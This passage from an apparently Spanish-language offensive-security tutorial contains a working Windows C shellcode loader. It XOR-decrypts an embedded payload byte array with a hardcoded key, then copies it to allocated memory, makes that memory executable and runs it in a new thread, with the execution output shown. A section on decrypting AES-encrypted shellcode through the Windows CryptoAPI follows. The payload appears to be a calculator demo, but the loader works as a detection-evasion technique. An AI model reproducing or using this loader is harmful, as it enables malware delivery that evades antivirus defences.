class="mh">0xde</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x21</span> <span class="p">};</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"y__modaba!!!"</span><span class="p">;</span>
	
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sotred payload in .data section %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"payload addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualAlloc] of new moemory region %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"exec_mem addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
	<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Decripted payload XOR %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> Decripted pyaload XOR 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [RtlMoveMemory] copy data </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">calc_payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [CreateThread] Exec stored payload </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Salida de la ejecución:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sotred payload in .data section payload addr         : 0x000000C46C6FF830

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x000002A2576A0000

 Decripted payload XOR 1819277360

 Decripted pyaload XOR 0x000000C46C6FF830

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload
</code></pre></div></div>

<p><img src="/assets/images/xor_encryption.png" alt="xor_encryption" /></p>

<h3 id="encriptación-aes-de-shellcode">Encriptación AES de shellcode</h3>

<p>Para las operaciones criptográficas con la clave simétrica de AES, se utilizará la nueva API de Windows Cryptography API: Next Generation.
A continuación se define el pseudo-código asociado a la desencriptación de un payload mediant una clave dada:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. open a handle hProv to a Cryptographic Service Provider - a module</span>
<span class="c1">// implementing specific crypto algorithms, like RSA, AES, etc.</span>
<span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)</span>

<span class="c1">// 2. prepare a new hashing object to generate a SHA-256 hash from the provided key</span>
<span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)</span>

<span class="c1">// 3. create SHA-256 hash from the key</span>
<span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="c1">// 4. derive a symmetric AES-256 key from the hash</span>
<span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">)</span>

<span class="c1">// 5. finally, decrypt the payload</span>
<span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)</span>
</code></pre></div></div>

<p>Explicación de cada una de las funciones y parámetros:</p>

<h4 id="cryptacquirecontextw">CryptAcquireContextW()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">CryptAcquireContextW</span><span class="p">(</span>
  <span class="n">HCRYPTPROV</span> <span class="o">*</span><span class="n">phProv</span><span class="p">,</span>        <span class="c1">// pointer to a handle of a CSP [out param]</span>
  <span class="n">LPCWSTR</span>    <span class="n">pszContainer</span><span class="p">,</span>   <span class="c1">// key container name (null-terminated string). When dwFlags is set to CRYPT_VERIFYCONTEXT, pszContainer must be set to NULL</span>
  <span class="n">LPCWSTR</span>    <span class="n">pszProvider</span><span class="p">,</span>    <span class="c1">// null-terminated string that contains the name of the CSP to be used. If NULL == default provider</span>
  <span class="n">DWORD</span>      <span class="n">dwProvType</span><span class="p">,</span>    <span class="c1">// type of provider to acquire, ex. PROV_RSA_FULL, PROV_RSA_AES, PROV_DSS_DH, etc.</span>
  <span class="n">DWORD</span>      <span class="n">dwFlags</span>        <span class="c1">// flag values, usually set to zero. CRYPT_VERIFYCONTEXT for ephemeral keys</span>
<span class="p">);</span>
</code></pre></div></div>

<h4 id="cryptcreatehash">CryptCreateHash()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">CryptCreateHash</span><span class="p">(</span>
  <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">,</span>    <span class="c1">// handle to a CSP created by a call to CryptAcquireContext()</span>
  <span class="n">ALG_ID</span>     <span class="n">Algid</span><span class="p">,</span>    <span class="c1">// identifies the hash algorithm to use, ex. CALG_3DES, CALG_AES_128, CALG_ECDH, etc.</span>
  <span class="n">HCRYPTKEY</span>  <span class="n">hKey</span><span class="p">,</span>     <span class="c1">// type of hash algorithm is a keyed hash (like MAC or HMAC). Zero if nonkeyed algos</span>
  <span class="n">DWORD</span>      <span class="n">dwFlags</span><span class="p">,</span>  <span class="c1">// 0 or CRYPT_SECRETDIGEST (not used)</span>
  <span class="n">HCRYPTHASH</span> <span class="o">*</span><span class="n">phHash</span>   <span class="c1">// address to which the function copies a handle to the new hash object</span>
<span class="p">);</span>
</code></pre></div></div>

<h4 id="crypthashdata">CryptHashData()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CryptHashData</span><span class="p">(</span>
  <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">,</span>      <span class="c1">// handle of the hash object</span>
  <span class="k">const</span> <span class="n">BYTE</span> <span class="o">*</span><span class="n">pbData</span><span class="p">,</span>    <span class="c1">// pointer to a buffer that contains the data to be added to the hash object</span>
  <span class="n">DWORD</span>      <span class="n">dwDataLen</span><span class="p">,</span>  <span class="c1">// number of bytes of data to be added</span>
  <span class="n">DWORD</span>      <span class="n">dwFlags</span>     <span class="c1">// 0 - nothing, 0x1 - CRYPT_USERDATA</span>
<span class="p">);</span>
</code></pre></div></div>

<h4 id="cryptderivekey">CryptDeriveKey()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CryptDeriveKey</span><span class="p">(</span>
  <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">,</span>      <span class="c1">// handle of a CSP created by a call to CryptAcquireContext()</span>
  <span class="n">ALG_ID</span>     <span class="n">Algid</span><span class="p">,</span>      <span class="c1">// identifies the hash algorithm to use, ex. CALG_3DES, CALG_AES_128, CALG_ECDH, etc. </span>
  <span class="n">HCRYPTHASH</span> <span class="n">hBaseData</span><span class="p">,</span>  <span class="c1">// handle to a hash object that has been fed the exact base data</span>
  <span class="n">DWORD</span>      <span class="n">dwFlags</span><span class="p">,</span>    <span class="c1">// type of key generated, can be zero or one or more values, ex. CRYPT_CREATE_SALT, CRYPT_EXPORTABLE, CRYPT_UPDATE_KEY, etc.</span>
  <span class="n">HCRYPTKEY</span>  <span class="o">*</span><span class="n">phKey</span>      <span class="c1">// pointer to a variable to receive the address of the handle of the newly generated key</span>
<span class="p">);</span>
</code></pre></div></div>
<h4 id="cryptdecrypt">CryptDecrypt()</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CryptDecrypt</span><span class="p">(</span>
  <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">,</span>        <span class="c1">// handle to the key to use for the decryption</span>
  <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">,</span>      <span class="c1">// handle to a hash object. If no hash, must be zero</span>
  <span class="n">BOOL</span>      <span class="n">Final</span><span class="p">,</span>       <span class="c1">// specifies whether this is the last section in a series being decrypted. If TRUE - the last block.</span>
  <span class="n">DWORD</span>     <span class="n">dwFlags</span><span class="p">,</span>     <span class="c1">// possible values: CRYPT_OAEP or CRYPT_DECRYPT_RSA_NO_PADDING_CHECK</span>
  <span class="n">BYTE</span>      <span class="o">*</span><span class="n">pbData</span><span class="p">,</span>     <span class="c1">// pointer to a buffer that contains the data to be decrypted. After the decryption, the plaintext is placed back into this same buffer.</span>
  <span class="n">DWORD</span>     <span class="o">*</span><span class="n">pdwDataLen</span>  <span class="c1">// length of the pbData buffer</span>
<span class="p">);</span>
</code></pre></div></div>

      </section>
    </div>
  </body>
</html>
